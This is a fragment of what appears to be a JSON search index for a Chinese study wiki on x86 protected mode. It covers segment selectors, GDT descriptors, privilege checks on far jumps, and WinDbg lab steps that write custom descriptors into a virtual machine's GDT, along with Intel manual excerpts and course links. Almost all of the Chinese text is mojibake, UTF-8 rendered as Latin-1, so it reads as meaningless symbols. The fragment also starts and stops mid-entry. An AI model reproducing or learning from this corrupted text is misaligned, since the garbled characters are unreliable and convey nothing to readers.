00cff300`0000ffff00cff300`0000ffffDPLæ˜¯11å‡è®¾å½“å‰CPLæ˜¯00CPLâ‰¤DPLï¼Œé€šè¿‡ï¼›RPLâ‰¤DPLï¼Œé€šè¿‡ã€‚å…è®¸å‡è®¾å½“å‰CPLä¸æ˜¯0CPLï¼DPLï¼Œä¸é€šè¿‡ï¼›RPLâ‰¤DPLï¼Œé€šè¿‡ã€‚ä¸å…è®¸"},{"title":"æ®µé—´è·³è½¬","path":"/wiki/Protected_Mode/æ®µé—´è·³è½¬.html","content":"æœ¬ç¯‡è®²è§£ä»£ç é—´çš„è·³è½¬(æ®µé—´è·³è½¬ éè°ƒç”¨é—¨ä¹‹ç±»çš„) åŸºæœ¬æ¦‚å¿µ æ®µé—´è·³è½¬ï¼Œæœ‰2ç§æƒ…å†µï¼Œå³è¦è·³è½¬çš„æ®µæ˜¯ä¸€è‡´ä»£ç æ®µï¼ˆconforming code segmentï¼‰è¿˜æ˜¯éä¸€è‡´ä»£ç æ®µï¼ˆnonconforming code segmentï¼‰ï¼Œ(æ®µæè¿°ç¬¦ä¸­ä»£ç æ®µTYPEåŸŸçš„Cä½æ¥åˆ¤æ–­)ã€‚ åŒæ—¶ä¿®æ”¹CSä¸EIPçš„æŒ‡ä»¤ï¼šJMP FAR/ CALL FAR/RETF /INT /IRETED åªæ”¹å˜EIPçš„æŒ‡ä»¤ï¼šJMP/ CALL / JCC/RET æœ¬ç¯‡åªä»‹ç»æ®µé—´è·³è½¬ï¼Œæ•…åªä½¿ç”¨JMP FARï¼Œå³ä¸ºé•¿è·³è½¬ã€‚ ä¸€è‡´ä»£ç æ®µå’Œéä¸€è‡´ä»£ç æ®µ ä¸€è‡´ä»£ç æ®µï¼Œä¹Ÿç§°ä¸ºå…±äº«æ®µï¼š ç‰¹æƒçº§é«˜çš„ç¨‹åºä¸å…è®¸è®¿é—®ç‰¹æƒçº§ä½çš„æ•°æ®ï¼šæ ¸å¿ƒæ€ä¸å…è®¸è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®ã€‚ å…±äº«æ®µå°±æ˜¯ç»™ç‰¹æƒçº§ä½çš„ç¨‹åºç”¨çš„ã€‚ ä¸ºä»€ä¹ˆç‰¹æƒçº§é«˜çš„ç¨‹åºä¸å…è®¸è®¿é—®ç‰¹æƒçº§ä½çš„æ•°æ®ï¼Ÿè§£é‡Šï¼šCPUä¼šæä¾›å¾ˆå¤šç‰¹æ€§ï¼Œä½†å†™æ“ä½œç³»ç»Ÿçš„äººç”¨ä¸ç”¨CPUæä¾›çš„æ‰‹æ®µæ˜¯å¦ä¸€ç äº‹ã€‚å†™æ“ä½œç³»ç»Ÿçš„äººå¯èƒ½è§‰å¾—æ²¡å¿…è¦æˆ–è‡ªå·±å®ç° ç‰¹æƒçº§ä½çš„ç¨‹åºå¯ä»¥è®¿é—®åˆ°ç‰¹æƒçº§é«˜çš„æ•°æ®ï¼Œä½†ç‰¹æƒçº§ä¸ä¼šæ”¹å˜ï¼šä½ æ˜¯ç”¨æˆ·æ€ï¼Œè®¿é—®åˆ°äº†é«˜æƒé™çš„æ•°æ®ï¼Œä½†ä½ æœ¬æ¥æ˜¯ç”¨æˆ·æ€ï¼Œè®¿é—®åè¿˜æ˜¯ç”¨æˆ·æ€ å¯¹äºæ™®é€šä»£ç æ®µï¼Œä¹Ÿå°±æ˜¯éä¸€è‡´ä»£ç æ®µï¼š åªå…è®¸åŒçº§è®¿é—® ç»å¯¹ç¦æ­¢ä¸åŒçº§åˆ«çš„è®¿é—®ï¼šæ ¸å¿ƒæ€ä¸æ˜¯ç”¨æˆ·æ€ï¼Œç”¨æˆ·æ€ä¹Ÿä¸æ˜¯æ ¸å¿ƒæ€ æ“ä½œç³»ç»Ÿæä¾›äº†è¿™ä¹ˆä¸€æ®µä»£ç ï¼Œè¯¥æ®µä»£ç æä¾›äº†ä¸€äº›é€šç”¨çš„åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½ä¸ä¼šç ´ååˆ°ç³»ç»Ÿå†…æ ¸çš„æ•°æ®ã€‚æˆ‘å¸Œæœ›è®©è¿™ç±»ä»£ç æ˜¯å¯ä»¥ç›´æ¥è®©åº”ç”¨å±‚æ¥è®¿é—®çš„ï¼Œå› ä¸ºè¿™æ ·çš„è¦æ±‚ï¼Œæ‰€ä»¥ç”¨ä¸€è‡´ä»£ç æ®µæ¥ä¿®é¥°è¿™æ®µä»£ç ã€‚ æ®µé—´è·³è½¬æµç¨‹ ä¾‹å­ï¼šCPUå¦‚ä½•æ‰§è¡Œè¿™è¡Œä»£ç JMP 0x20:0x004183D7ï¼Ÿ æµç¨‹å¦‚ä¸‹ï¼š æ®µé€‰æ‹©å­æ‹†åˆ† 0x20å¯¹åº”äºŒè¿›åˆ¶ï¼š0000 0000 0010 0000 æ‰€ä»¥ï¼š RPL=0 TI=0 Index=4 æŸ¥è¡¨å¾—åˆ°æ®µæè¿°ç¬¦ TI=Oæ‰€ä»¥æŸ¥GDTè¡¨ï¼ŒIndex=4æ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦ã€‚æ³¨æ„ï¼Œåªæœ‰æ®µæè¿°ç¬¦æ˜¯å¦‚ä¸‹å››ç§æƒ…å†µæ‰å¯ä»¥è·³è½¬:ä»£ç æ®µã€è°ƒç”¨é—¨ã€TSSä»»åŠ¡æ®µã€ä»»åŠ¡é—¨ã€‚åé¢3ç§å°†ä¼šåœ¨ä»¥åçš„æ•™ç¨‹è¯¦ç»†è®²è§£ã€‚æœ¬æ¬¡å‡è®¾æŸ¥åˆ°çš„æ˜¯ä»£ç æ®µï¼Œè¿™ä¸€æ­¥çš„æ£€æŸ¥é€šè¿‡ã€‚ æƒé™æ£€æŸ¥ ä»£ç æ®µçš„æƒé™æ£€æŸ¥ å¦‚æœæ˜¯éä¸€è‡´ä»£ç æ®µï¼Œè¦æ±‚ï¼šCPL==DPLä¸”RPL&lt;=DPL å¦‚æœæ˜¯ä¸€è‡´ä»£ç æ®µï¼Œè¦æ±‚ï¼šCPL&gt;=DPL åŠ è½½æ®µæè¿°ç¬¦ é€šè¿‡ä¸Šé¢çš„æƒé™æ£€æŸ¥åï¼ŒCPUä¼šå°†æ®µæè¿°ç¬¦åŠ è½½åˆ°CSæ®µå¯„å­˜å™¨ä¸­ã€‚ ä»£ç æ‰§è¡Œ CPUå°†CS.Base + Offsetçš„å€¼å†™å…¥EIPï¼Œç„¶åè·³è½¬åˆ°å°†è¦æ‰§è¡Œçš„CS:EIPå¤„çš„ä»£ç ï¼Œæ®µé—´è·³è½¬ç»“æŸã€‚ï¼ˆOffsetæ˜¯ä¾‹å­ä¸­çš„0x004183D7ï¼‰ æ³¨ï¼šç›´æ¥å¯¹ä»£ç æ®µè¿›è¡ŒJMPæˆ–è€…CALLçš„æ“ä½œï¼Œæ— è®ºç›®æ ‡æ˜¯ä¸€è‡´ä»£ç æ®µè¿˜æ˜¯éä¸€è‡´ä»£ç æ®µï¼ŒCPLéƒ½ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚å¦‚æœè¦æå‡CPLçš„æƒé™ï¼Œåªèƒ½é€šè¿‡è°ƒç”¨é—¨ã€‚ å®éªŒ è·³è½¬æŒ‡ä»¤ CPL æ®µé€‰æ‹©å­ä¸­çš„RPL æ„é€ çš„æ®µæè¿°ç¬¦ ç›®æ ‡æ®µæè¿°ç¬¦Cä½ DPL é¢„æœŸç»“æœ jmp far 0x4B:00401F40 3 3 00cffb00`0000ffff éä¸€è‡´ä»£ç æ®µ 3 è·³è½¬æˆåŠŸ jmp far 0x4B:00401F40 3 3 00cf9b00`0000ffff éä¸€è‡´ä»£ç æ®µ 0 è·³è½¬å¤±è´¥ jmp far 0x4B:00401F40 3 3 00cf9f00`0000ffff ä¸€è‡´ä»£ç æ®µ 0 è·³è½¬æˆåŠŸ jmp far 0x4B:00401F40 3 0 00cfff00`0000ffff ä¸€è‡´ä»£ç æ®µ 3 è·³è½¬æˆåŠŸ æ„é€ æ®µæè¿°ç¬¦ æ‰¾ä¸€ä¸ªéä¸€è‡´ä»£ç æ®µæè¿°ç¬¦,å¤åˆ¶ä¸€ä»½,å†™å…¥åˆ°GDTè¡¨ä¸­ 123456kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000 æ¯”å¦‚æ‰¾çš„è¿™ä¸ªæ®µæè¿°ç¬¦ï¼Œæ˜¯ä¸ªéä¸€è‡´ä»£ç æ®µçš„æè¿°ç¬¦00cffb00`0000ffffã€‚ å°†00cffb00`0000ffffæ•°æ®å†™å…¥æŸä¸ªPä½ä¸º0çš„ä½ç½®ï¼Œæ¯”å¦‚8003f048ã€‚ windbgä¸­ä¿®æ”¹ï¼ŒæŸ¥çœ‹æ˜¯å¦ä¿®æ”¹æˆåŠŸï¼Œç„¶ågè®©è™šæ‹Ÿæœºç»§ç»­è¿è¡Œã€‚ 12345678kd&gt; eq 8003f048 00cffb00`0000ffffkd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00cffb00`0000ffffkd&gt; g ODä¸­æ‹–å…¥ä¸€ä¸ªç¨‹åºï¼Œä¿®æ”¹æŒ‡ä»¤ï¼Œç„¶åF8å•æ­¥æ‰§è¡Œï¼ˆoffsetæ ¹æ®æ‹–å…¥çš„ç¨‹åºç°æ‰¾çš„ï¼‰ 1jmp far 0x4B:00401F40 ç›®æ ‡æ®µæè¿°ç¬¦ä¸ºï¼šéä¸€è‡´ä»£ç æ®µ+DPLä¸º3ç›®æ ‡æ®µæè¿°ç¬¦ï¼š00cffb00`0000fffféä¸€è‡´ä»£ç æ®µï¼Œf=1111ï¼ŒDPL=11jmpæ„é€ çš„æ®µé€‰æ‹©å­0x4B0000 0000 0100 10110000 0000 0100 1 0 11Index=9TI=0ï¼ŒæŸ¥GDTè¡¨RPL=11CPL=3æ‰§è¡Œå‰åˆ†æï¼šCPLä¸º3ï¼ŒRPLä¸º3ï¼Œè®¿é—®éä¸€è‡´ä»£ç æ®µï¼ŒDPLä¸º3ã€‚é¢„æœŸï¼šèƒ½æˆåŠŸè·³è½¬ã€‚ä¿®æ”¹æŒ‡ä»¤åF8æ‰§è¡Œå‰æ‰§è¡ŒåæˆåŠŸä¿®æ”¹äº†CSå’Œip ç›®æ ‡æ®µæè¿°ç¬¦ä¸ºï¼šéä¸€è‡´ä»£ç æ®µ+DPLä¸º0å°†ä¸Šä¸ªä¾‹å­ä¸­çš„00cffb00`0000ffffçš„DPLä¿®æ”¹æˆ0ï¼Œå˜æˆ00cf9b00`0000ffff12345678kd&gt; eq 8003f048 00cf9b00`0000ffffkd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00cf9b00`0000ffffkd&gt; gODä¸­é‡æ–°è°ƒè¯•ï¼Œè·³è½¬æŒ‡ä»¤ä¸å˜ï¼Œç„¶åF81jmp far 0x4B:00401F40æ‰§è¡Œå‰åˆ†æï¼šCPLä¸º3ï¼ŒRPLä¸º3.è®¿é—®éä¸€è‡´ä»£ç æ®µï¼ŒDPLä¸º0é¢„æœŸï¼šä¸èƒ½æˆåŠŸè·³è½¬ã€‚æ‰§è¡Œåï¼šè¿›å…¥åˆ°äº†å¼‚å¸¸æ¨¡å—ï¼Œè·³è½¬å¤±è´¥ã€‚ ç›®æ ‡æ®µæè¿°ç¬¦ä¸ºï¼šä¸€è‡´ä»£ç æ®µ+DPLä¸º0å°†ä¸Šä¸ªä¾‹å­ä¸­00cf9b00`0000ffffä¿®æ”¹æˆä¸€è‡´ä»£ç æ®µï¼Œå˜æˆ00cf9f00`0000ffff12345678kd&gt; eq 8003f048 00cf9f00`0000ffffkd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00cf9f00`0000ffffkd&gt; gODä¸­é‡æ–°è°ƒè¯•ï¼Œè·³è½¬æŒ‡ä»¤ä¸å˜ï¼Œç„¶åF81jmp far 0x4B:00401F40æ‰§è¡Œå‰åˆ†æï¼šCPLä¸º3ï¼ŒRPLä¸º3ï¼Œè®¿é—®ä¸€è‡´ä»£ç æ®µï¼ŒDPLä¸º0ã€‚é¢„æœŸï¼šèƒ½æˆåŠŸè·³è½¬ã€‚æ‰§è¡Œåï¼šæˆåŠŸè·³è½¬ã€‚ ç›®æ ‡æ®µæè¿°ç¬¦ä¸ºï¼šä¸€è‡´ä»£ç æ®µ+DPLä¸º3å°†ä¸Šä¸ªä¾‹å­ä¸­00cf9f00`0000ffffçš„DPLä¿®æ”¹ä¸º3ï¼Œå˜æˆ00cfff00`0000ffff12345678kd&gt; eq 8003f048 00cfff00`0000ffffkd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00cfff00`0000ffffkd&gt; gODä¸­é‡æ–°è°ƒè¯•ï¼Œè·³è½¬æŒ‡ä»¤ä¸å˜ï¼Œç„¶åF81jmp far 0x4B:00401F40æ‰§è¡Œå‰åˆ†æï¼šCPLä¸º3ï¼ŒRPLä¸º3ï¼Œè®¿é—®ä¸€è‡´ä»£ç æ®µï¼ŒDPLä¸º3ã€‚é¢„æœŸï¼šèƒ½æˆåŠŸè·³è½¬ã€‚æ‰§è¡Œåï¼šè·³è½¬æˆåŠŸã€‚ é—®é¢˜ ä¿®æ”¹æ®µæè¿°ç¬¦çš„baseåæ— æ³•æ‰§è¡Œ,æ¯”å¦‚:00cffb000001ffff cs.baseåªèƒ½ä¸º0ï¼Œå¦‚æœæ˜¯å…¶ä»–å€¼ï¼Œå®éªŒè¿›è¡Œä¸ä¸‹å»ã€‚è€å¸ˆä¹Ÿä¸çŸ¥é“ï¼Œæ˜¯ODçš„bugè¿˜æ˜¯ä»€ä¹ˆï¼Œæ²¡æ·±ç©¶ã€‚ åœ¨jmp faræˆåŠŸå,åœ¨ODä¸­å‘ç°CSæ®µçš„baseå’Œlimitæ°¸è¿œéƒ½æ˜¯0ã€‚ è¿™æ˜¯ODçš„bugï¼Œæ²¡æœ‰åˆ·æ–°ã€‚jmp faråï¼Œå¯ä»¥ç”¨pchunteræŸ¥çœ‹æ®µå¯„å­˜å™¨æœ€æ–°çš„å€¼ã€‚ æ€»ç»“ 1ã€ä¸ºäº†å¯¹æ•°æ®è¿›è¡Œä¿æŠ¤ï¼Œæ™®é€šä»£ç æ®µæ˜¯ç¦æ­¢ä¸åŒçº§åˆ«è¿›è¡Œè®¿é—®çš„ã€‚ç”¨æˆ·æ€çš„ä»£ç ä¸èƒ½è®¿é—®å†…æ ¸çš„æ•°æ®ï¼ŒåŒæ ·ï¼Œå†…æ ¸æ€çš„ä»£ç ä¹Ÿä¸èƒ½è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®ã€‚ 2ã€å¦‚æœæƒ³æä¾›ä¸€äº›é€šç”¨çš„åŠŸèƒ½ï¼Œè€Œä¸”è¿™äº›åŠŸèƒ½å¹¶ä¸ä¼šç ´åå†…æ ¸æ•°æ®ï¼Œé‚£ä¹ˆå¯ä»¥é€‰æ‹©ä¸€è‡´ä»£ç æ®µï¼Œè¿™æ ·ä½çº§åˆ«çš„ç¨‹åºå¯ä»¥åœ¨ä¸æå‡CPLæƒé™ç­‰çº§çš„æƒ…å†µä¸‹å³å¯ä»¥è®¿é—®ã€‚ 3ã€å¦‚æœæƒ³è®¿é—®æ™®é€šä»£ç æ®µï¼Œåªæœ‰é€šè¿‡â€œè°ƒç”¨é—¨â€ç­‰æå‡CPLæƒé™ï¼Œæ‰èƒ½è®¿é—®ã€‚"},{"title":"è‰ç¨¿æœ¬","path":"/wiki/Protected_Mode/è‰ç¨¿æœ¬.html","content":"è‹±è¯­å•è¯ instruction æŒ‡ä»¤ IA-32å’ŒIA-32eçš„åŒºåˆ«ï¼š IA-32, also known as the Intel Architecture, 32-bit, is the instruction set architecture (ISA) introduced by Intel in the 1980s with the 386 microprocessor. Itâ€™s a 32-bit version of Intelâ€™s earlier 16-bit x86 architecture. The IA-32 architecture includes features such as protected mode, virtual memory, paging, and the ability to switch between real mode (for backward compatibility with the 8086) and the more advanced protected mode. IA-32e is a mode of operation in some Intel microprocessors that implements the Intel 64 or x86-64 architecture, which is a 64-bit version of the x86 instruction set. IA-32e mode, also known as Intel 64 mode, has two sub-modes: compatibility sub-mode and 64-bit sub-mode. In compatibility sub-mode, the processor can execute 32-bit and 16-bit applications under a 64-bit operating system. This allows for significant backward compatibility with older applications and operating systems. In 64-bit sub-mode, the processor can execute 64-bit applications and use 64-bit virtual addresses. This allows for the use of larger amounts of memory than is possible in a 32-bit system, and it provides for potentially faster computation because of the larger number of general-purpose and floating-point registers in the 64-bit architecture. In summary, the primary difference between IA-32 and IA-32e mode is the latterâ€™s capability to support 64-bit computing, which allows for larger memory addressing and potentially faster computation. IA-32e mode also provides backward compatibility for running 32-bit and 16-bit applications under a 64-bit operating system. ç™¾åº¦äº‘ä¸Šçš„è¯¾å‰è§†é¢‘å¯¹åº”ç›®å½•ï¼š https://www.bcdaren.com/video/videoContent/329494357092864000 æ»´æ°´åŸºç¡€ä¸‰æœŸ å¯èƒ½æœ‰ç”¨çš„åˆ«äººçš„è¯¾åä½œä¸šï¼š https://github.com/smallzhong/drip-education-homework https://github.com/123yonghu/- https://blog.csdn.net/weixin_43657383/article/details/130352367 å®æ¨¡å¼å’Œä¿æŠ¤æ¨¡å¼ All Intel 64 and IA-32 processors enter real-address mode following a power-up or reset (see Chapter 10, â€œProcessor Management and Initializationâ€). Software then initiates the switch from real-address mode to protected mode. If IA-32e mode operation is desired, software also initiates a switch from protected mode to IA- 32e mode å…ˆè¿›å…¥å®æ¨¡å¼ï¼Œç„¶åè¿›å…¥ä¿æŠ¤æ¨¡å¼ è®¿é—®å†…å­˜éƒ½è¦å…ˆé€šè¿‡GDTæˆ–LDTï¼Œæ‰¾åˆ°æ®µæè¿°ç¬¦ï¼Œæ®µæè¿°ç¬¦ä¸­å«æœ‰è¿™å—å†…å­˜çš„è®¿é—®æƒé™ã€ç±»å‹ã€ä½¿ç”¨ä¿¡æ¯ When operating in protected mode, all memory accesses pass through either the global descriptor table (GDT) or an optional local descriptor table (LDT) as shown in Figure 2-1. These tables contain entries called segment descriptors. Segment descriptors provide the base address of segments well as access rights, type, and usage information. The linear address of the base of the GDT is contained in the GDT register (GDTR); the linear address of the LDT is contained in the LDT register (LDTR) é€‰æ‹©å­16ä½ 13ä½æ˜¯æ®µæè¿°ç¬¦çš„ç´¢å¼•å· 1ä½æ˜¯ global/local æ ‡å¿—ä½ (determines whether the selector points to the GDT or the LDT), 1ä½æ˜¯è®¿é—®æƒé™ è¿˜æœ‰access rights information. æ®µæè¿°ç¬¦ç»“æ„ï¼š CPLï¼Œcurrent privilege level(CPL) 2.1.2 ç³»ç»Ÿæ®µï¼› the task-state segment (TSS) and the LDT TSSs and LDTs have segment descriptors defined for them. The GDT is not considered a segment because it is not accessed by means of a segment selector and segment descriptor å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ä¸è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæ®µï¼Œå› ä¸ºå®ƒä¸æ˜¯é€šè¿‡æ®µé€‰æ‹©å™¨å’Œæ®µæè¿°ç¬¦æ¥è®¿é—®çš„ã€‚ gates (call gates, interrupt gates, trap gates, and task gates Task gates are not supported in IA-32e mode 2.1.2.1 IA32-e gates 2.1.3ä»»åŠ¡é—¨ interrupt descriptor table (IDT) Like the GDT, the IDT is not a segment. The linear address for the base of the IDT is contained in the IDT register (IDTR). IDTä¹Ÿä¸æ˜¯ä¸€ä¸ªæ®µ 2.1.4ä¸­æ–­å’Œå¼‚å¸¸å¤„ç† 2.1.5å†…å­˜ç®¡ç† The base physical address of the paging-structure hierarchy is contained in control register CR3 ç‰©ç†å†…å­˜ï¼Œå’Œè™šæ‹Ÿå†…å­˜ï¼ˆé¡µé¢æ˜ å°„æœºåˆ¶ï¼‰ 2.1.6 ç³»ç»Ÿå¯„å­˜å™¨ 2.4 å†…å­˜ç®¡ç†å¯„å­˜å™¨ The processor provides four memory-management registers (GDTR, LDTR, IDTR, and TR) that specify the locations of the data structures which control segmented memory management (see Figure 2-6). Special instructions are provided for loading and storing these registers. æ­£è¯¾ 02 æ®µ é¡µæ˜¯CPUçš„æ¦‚å¿µ å†…æ ¸æ˜¯æ“ä½œç³»ç»Ÿçš„æ¦‚å¿µ ç™½çš®ä¹¦ 3å·ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ7ç« ï¼Œä¿æŠ¤æ¨¡å¼ 2å·ï¼ŒæŸ¥æŒ‡ä»¤ æ»´æ°´è¯¾ç¨‹ å¯èƒ½æœ‰ç”¨ï¼šhttps://github.com/yifengyou/learn-c/blob/master/docs/æ•™ç¨‹/æ»´æ°´é€†å‘è§†é¢‘æ•™ç¨‹.md æ»´æ°´ä¸‰æœŸæ­£è¯¾ï¼šï¼Ÿ https://www.zygx8.com/thread-16226-1-1.html http://bbs.jiandaima.com/forum.php?mod=viewthread&amp;tid=3878 https://www.eyyba.com/thread-20094-1-1.html ä¸­çº§ç­ ä¿æŠ¤æ¨¡å¼ æ“ä½œç³»ç»Ÿç›®å½•ï¼š"},{"title":"æ®µæè¿°ç¬¦ä¸æ®µé€‰æ‹©å­","path":"/wiki/Protected_Mode/æ®µæè¿°ç¬¦ä¸æ®µé€‰æ‹©å­.html","content":"æ®µé€‰æ‹©å­ æ®µé€‰æ‹©å­çš„RPLä¸€å®šè¦&lt;=å¯¹åº”æ®µæè¿°ç¬¦çš„DPLï¼Œå¦åˆ™è¯•å›¾ä½¿ç”¨è¯¥é€‰æ‹©å­åŠ è½½å¯¹åº”æ®µæè¿°ç¬¦çš„è¡Œä¸ºå°†ç”±äºæƒé™ä¸è¶³è€Œå¤±è´¥ã€‚ GDTå’ŒLDT å½“æ‰§è¡Œç±»ä¼¼å¦‚ä¸‹æŒ‡ä»¤æ—¶ï¼ŒCPUæŸ¥è¡¨ï¼Œæ¥å¡«å……å¯„å­˜å™¨ä¸å¯è§çš„80ä½ã€‚ 1mov ds,ax GDTè¡¨ï¼ˆå…¨å±€æè¿°ç¬¦è¡¨ï¼‰ï¼Œæ˜¯ä¸€å—å†…å­˜ï¼Œæ˜¯CPUè®¾è®¡ä¸­è¦æ±‚æ“ä½œç³»ç»Ÿæä¾›çš„ä¸€å—å†…å­˜ã€‚è¯¥å†…å­˜æ˜¯æ“ä½œç³»ç»Ÿåœ¨å¯åŠ¨æ—¶å¡«å……çš„ã€‚ä½¿ç”¨windbgçš„å‘½ä»¤å¯ä»¥æŸ¥çœ‹gdtè¡¨çš„åœ°å€ã€‚ LDTï¼ˆå±€éƒ¨æè¿°ç¬¦è¡¨ï¼‰ã€‚ä½†æ˜¯åœ¨windowsä¸­å¾ˆå°‘ï¼ˆä¹Ÿå¯èƒ½æ˜¯æ²¡æœ‰ï¼‰ä½¿ç”¨LDTã€‚ GDTè¡¨åœ¨å“ªé‡Œï¼Ÿ gdtrå¯„å­˜å™¨ï¼ˆwindbgä¼ªå¯„å­˜å™¨ï¼Œæ˜¯windbgé€šè¿‡sgdt lgdtæŒ‡ä»¤è·å–çš„.ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·ï¼Œæ‰æ¨¡æ‹Ÿäº†ä¸€ä¸ªå¯„å­˜å™¨å«gdtrï¼Œå®é™…æ˜¯æ²¡æœ‰è¿™ä¸ªå¯„å­˜å™¨çš„ï¼‰ã€‚ gdtré‡Œå­˜äº†ä¸¤ä¸ªå€¼ï¼ŒGDTè¡¨çš„èµ·å§‹åœ°å€å’Œé•¿åº¦ã€‚ä¸€å…±48ä½ï¼Œ32ä½è¡¨ç¤ºGDTè¡¨å­˜å‚¨åœ¨å“ªé‡Œï¼Œ16ä½å­˜å‚¨å¤§å°ã€‚ 1r gdtr æŸ¥çœ‹gdtrå¯„å­˜å™¨çš„å‰32ä½ä¹Ÿå°±æ˜¯ä½ç½®ã€‚ 1r gdtl æŸ¥çœ‹gdtrå¯„å­˜å™¨çš„å16ä½ä¹Ÿå°±æ˜¯å¤§å°ã€‚ éƒ½æ˜¯æŸ¥gdtrã€‚ 4å­—èŠ‚å½¢å¼æ˜¾ç¤ºå†…å­˜æ•°æ®8å­—èŠ‚å½¢å¼æ˜¾ç¤ºå†…å­˜æ•°æ®æŸ¥çœ‹å›ºå®šæ•°é‡ä»¥dwordï¼Œ4å­—èŠ‚4å­—èŠ‚åœ°æ˜¾ç¤ºå†…å­˜æ•°æ®ã€‚ 1dd xxxx 123456789kd&gt; dd 8003f0008003f000 00000000 00000000 0000ffff 00cf9b008003f010 0000ffff 00cf9300 0000ffff 00cffb008003f020 0000ffff 00cff300 200020ab 80008b048003f030 f0000001 ffc093df 00000fff 0040f3008003f040 0400ffff 0000f200 00000000 000000008003f050 af000068 80008954 af680068 800089548003f060 2f40ffff 00009302 80003fff 0000920b8003f070 700003ff ff0092ff 0000ffff 80009a40ä»¥qwordï¼Œ8å­—èŠ‚8å­—èŠ‚åœ°æ˜¾ç¤ºå†…å­˜æ•°æ®ã€‚ 1dq XXXX 123456789kd&gt; dq 8003f0008003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffffæŸ¥çœ‹å›ºå®šæ•°é‡å…ƒç´ çš„å†…å­˜ã€‚ 1dq xxxx Lnum 40æ˜¯åå…­è¿›åˆ¶æ•°ï¼Œæ˜¾ç¤º40H=64Dä¸ª ä¸€è¡Œä¸¤ä¸ªï¼Œæ‰€ä»¥00~f0è¡Œ 123456789101112131415161718192021222324252627282930313233kd&gt; dq 8003f000 L408003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 00000000`000000008003f0a0 8200891b`23500068 00000000`000000008003f0b0 00000000`00000000 00000000`000000008003f0c0 00000000`00000000 00000000`000000008003f0d0 00000000`00000000 00000000`000000008003f0e0 f8009f71`a000ffff 00009200`0000ffff8003f0f0 8000984f`b68803b7 00009200`0000ffff8003f100 f8409339`7400ffff f8409339`7400ffff8003f110 f8409339`7400ffff 00000000`8003f1208003f120 00000000`8003f128 00000000`8003f1308003f130 00000000`8003f138 00000000`8003f1408003f140 00000000`8003f148 00000000`8003f1508003f150 00000000`8003f158 00000000`8003f1608003f160 00000000`8003f168 00000000`8003f1708003f170 00000000`8003f178 00000000`8003f1808003f180 00000000`8003f188 00000000`8003f1908003f190 00000000`8003f198 00000000`8003f1a08003f1a0 00000000`8003f1a8 00000000`8003f1b08003f1b0 00000000`8003f1b8 00000000`8003f1c08003f1c0 00000000`8003f1c8 00000000`8003f1d08003f1d0 00000000`8003f1d8 00000000`8003f1e08003f1e0 00000000`8003f1e8 00000000`8003f1f08003f1f0 00000000`8003f1f8 00000000`8003f200 æ®µæè¿°ç¬¦ GDTè¡¨ä¸­å­˜å‚¨ç€æ®µæè¿°ç¬¦ï¼Œæ¯ä¸€ä¸ªæ®µæè¿°ç¬¦8ä¸ªå­—èŠ‚ã€‚ä¸‹å›¾ä¸Šé¢çš„32ä½æ˜¯é«˜å­—èŠ‚ï¼Œä¸‹é¢32ä½æ˜¯ä½å­—èŠ‚ã€‚ å½“æ‰§è¡Œmov ds,axæŒ‡ä»¤æ—¶ï¼Œé™¤äº†ç»™å¯è§éƒ¨åˆ†èµ‹å€¼ã€‚æ­¤æ—¶axå……å½“æ®µé€‰æ‹©å­ï¼Œæ ¹æ®æ®µé€‰æ‹©å­ä¸­å­—æ®µï¼Œå»æŸ¥GDTæˆ–LDTè¡¨ï¼Œæ¥å¡«å……ä¸å¯è§çš„80ä½ã€‚ 123456789struct SegMent&#123; //å¯è§ WORD Selector;//16ä½Selectorã€‚å°±æ˜¯æ®µé€‰æ‹©å­çš„å€¼ã€‚ //ä¸å¯è§ WORD Attributes;//16ä½Attributesã€‚ä»æ®µæè¿°ç¬¦çš„Gä½åˆ°Typeä½ã€‚ DWORD 